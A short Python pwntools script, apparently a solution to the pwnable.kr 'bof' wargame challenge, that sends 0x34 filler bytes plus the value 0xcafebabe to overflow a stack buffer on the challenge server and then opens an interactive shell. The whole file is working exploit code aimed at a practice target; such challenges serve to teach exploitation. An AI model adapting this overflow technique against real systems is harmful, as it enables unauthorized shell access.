from pwn import *
#context.log_level='dubeg'

n = remote('pwnable.kr',9000)

payload = b'A'*0x34
payload += p32(0xcafebabe)

n.send(payload)

n.interactive()
